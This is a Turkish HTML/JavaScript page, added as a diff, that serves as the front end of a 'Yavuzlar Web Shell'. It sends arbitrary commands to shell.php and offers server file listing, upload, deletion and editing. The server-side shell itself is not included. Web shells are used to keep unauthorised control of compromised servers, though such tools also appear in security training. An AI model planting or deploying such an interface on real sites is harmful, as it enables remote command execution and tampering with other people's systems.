@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="tr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Yavuzlar Web Shell</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #1e1e2e;
+        color: #c9d1d9;
+        margin: 0;
+        padding: 0;
+      }
+      .container {
+        padding: 20px;
+      }
+      .header {
+        text-align: center;
+        background-color: #16161e;
+        padding: 20px;
+        border-bottom: 1px solid #44475a;
+      }
+      .header h1 {
+        margin: 0;
+      }
+      .form-group {
+        margin-bottom: 15px;
+      }
+      input,
+      select,
+      button {
+        padding: 10px;
+        margin-top: 5px;
+        border: none;
+        border-radius: 5px;
+      }
+      input,
+      select {
+        width: 100%;
+        background-color: #2e2e3e;
+        color: #c9d1d9;
+      }
+      button {
+        background-color: #44475a;
+        color: #c9d1d9;
+        cursor: pointer;
+      }
+      button:hover {
+        background-color: #6272a4;
+      }
+      .output {
+        margin-top: 20px;
+        padding: 15px;
+        background-color: #2e2e3e;
+        border-radius: 5px;
+        overflow-x: auto;
+        white-space: pre-wrap;
+      }
+      .file-manager {
+        margin-top: 20px;
+      }
+      .file-manager input[type="file"] {
+        display: none;
+      }
+      .custom-file-upload {
+        display: inline-block;
+        padding: 10px 20px;
+        background-color: #44475a;
+        color: #c9d1d9;
+        cursor: pointer;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <h1>Yavuzlar Web Shell</h1>
+    </div>
+    <div class="container">
+      <form id="command-form">
+        <div class="form-group">
+          <label for="command">Komut Girin:</label>
+          <input
+            type="text"
+            id="command"
+            name="command"
+            placeholder="örneğin, ls"
+          />
+        </div>
+        <button type="button" onclick="executeCommand()">Çalıştır</button>
+      </form>
+      <div class="output" id="output"></div>
+
+      <div class="file-manager">
+        <h2>Dosya Yöneticisi</h2>
+        <button type="button" onclick="listFiles()">Dosyaları Listele</button>
+        <label for="file-upload" class="custom-file-upload">Dosya Yükle</label>
+        <input id="file-upload" type="file" onchange="uploadFile()" />
+        <button type="button" onclick="deleteFile()">Dosya Sil</button>
+        <div class="form-group">
+          <input
+            type="text"
+            id="delete-file-name"
+            placeholder="Silinecek dosya"
+          />
+        </div>
+        <div class="form-group">
+          <button type="button" onclick="editFile()">Dosyayı Düzenle</button>
+          <input type="text" id="edit-file-name" placeholder="Düzenlenecek dosya" />
+        </div>
+        <textarea
+          id="edit-file-content"
+          placeholder="Dosya içeriğini burada düzenleyin"
+          rows="5"
+          style="width: 100%"
+        ></textarea>
+        <button type="button" onclick="saveFile()">Değişiklikleri Kaydet</button>
+        <div class="output" id="file-output"></div>
+      </div>
+    </div>
+    <script>
+      async function executeCommand() {
+        const command = document.getElementById("command").value;
+        const outputDiv = document.getElementById("output");
+
+        try {
+          const response = await fetch("shell.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ command }),
+          });
+
+          if (!response.ok) throw new Error("Ağ yanıtı düzgün değildi");
+
+          const data = await response.json();
+          outputDiv.textContent = data.output;
+        } catch (error) {
+          outputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+
+      async function listFiles() {
+        const fileOutputDiv = document.getElementById("file-output");
+
+        try {
+          const response = await fetch("shell.php?action=list", {
+            method: "GET",
+          });
+
+          if (!response.ok) throw new Error("Dosya listesi alınamadı");
+
+          const data = await response.json();
+          fileOutputDiv.textContent = data.files.join("\n");
+        } catch (error) {
+          fileOutputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+
+      async function showHelp() {
+        const fileOutputDiv = document.getElementById("file-output");
+
+        try {
+          const response = await fetch("shell.php?action=help", {
+            method: "GET",
+          });
+
+          if (!response.ok) throw new Error("Yardım alınamadı");
+
+          const data = await response.json();
+          fileOutputDiv.textContent = JSON.stringify(data.commands, null, 2);
+        } catch (error) {
+          fileOutputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+
+      async function uploadFile() {
+        const fileInput = document.getElementById("file-upload");
+        const file = fileInput.files[0];
+        const fileOutputDiv = document.getElementById("file-output");
+
+        const formData = new FormData();
+        formData.append("file", file);
+
+        try {
+          const response = await fetch("shell.php?action=upload", {
+            method: "POST",
+            body: formData,
+          });
+
+          if (!response.ok) throw new Error("Dosya yüklenemedi");
+
+          const data = await response.json();
+          fileOutputDiv.textContent = data.message;
+        } catch (error) {
+          fileOutputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+
+      async function deleteFile() {
+        const fileName = document.getElementById("delete-file-name").value;
+        const fileOutputDiv = document.getElementById("file-output");
+
+        try {
+          const response = await fetch(
+            "shell.php?action=delete&file=" + encodeURIComponent(fileName),
+            {
+              method: "GET",
+            }
+          );
+
+          if (!response.ok) throw new Error("Dosya silinemedi");
+
+          const data = await response.json();
+          fileOutputDiv.textContent = data.message;
+        } catch (error) {
+          fileOutputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+
+      async function editFile() {
+        const fileName = document.getElementById("edit-file-name").value;
+        const fileOutputDiv = document.getElementById("file-output");
+
+        try {
+          const response = await fetch(
+            "shell.php?action=edit&file=" + encodeURIComponent(fileName),
+            {
+              method: "GET",
+            }
+          );
+
+          if (!response.ok) throw new Error("Dosya içeriği alınamadı");
+
+          const data = await response.json();
+          document.getElementById("edit-file-content").value = data.content;
+          fileOutputDiv.textContent = `Düzenleniyor: ${fileName}`;
+        } catch (error) {
+          fileOutputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+
+      async function saveFile() {
+        const fileName = document.getElementById("edit-file-name").value;
+        const fileContent = document.getElementById("edit-file-content").value;
+        const fileOutputDiv = document.getElementById("file-output");
+
+        try {
+          const response = await fetch("shell.php?action=save", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ file: fileName, content: fileContent }),
+          });
+
+          if (!response.ok) throw new Error("Dosya kaydedilemedi");
+
+          const data = await response.json();
+          fileOutputDiv.textContent = data.message;
+        } catch (error) {
+          fileOutputDiv.textContent = `Hata: ${error.message}`;
+        }
+      }
+    </script>
+  </body>
+</html>
